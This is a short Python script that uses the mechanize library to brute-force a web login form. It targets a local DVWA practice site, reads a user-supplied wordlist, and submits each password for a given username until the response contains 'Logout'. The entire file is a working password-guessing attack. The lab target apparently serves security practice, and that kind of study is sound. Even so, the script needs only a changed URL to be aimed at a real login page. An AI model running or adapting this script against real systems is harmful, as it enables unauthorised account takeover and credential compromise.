import mechanize

###COLORS
rd = "\033[1;31m"
gr = "\033[1;32m"
yr = "\033[1;33m"

br = mechanize.Browser()

br.set_handle_equiv(True)
br.set_handle_redirect(True)
br.set_handle_referer(True)

print(yr+"site: http://127.0.0.1/DVWA-master/login.php")

br.open("http://127.0.0.1/DVWA-master/login.php")
######INPUTS########
u = input("Username: ")
addr = input("Wordlist: ")


file = open(addr, "r")
passwords = file.read().splitlines()
for p in passwords:
    br.select_form(nr= 0)
    br.form['username'] = u
    br.form['password'] = p
    resp = br.submit()
    data = resp.read()
    out = data.decode()

    if "Logout" in out:
        print(gr + "Match Found => " + "Username: " + u + " Password: " + p)
        break
    else:
        print(rd + "Match Not Found => " + "Username: " + u + " Password: " + p)

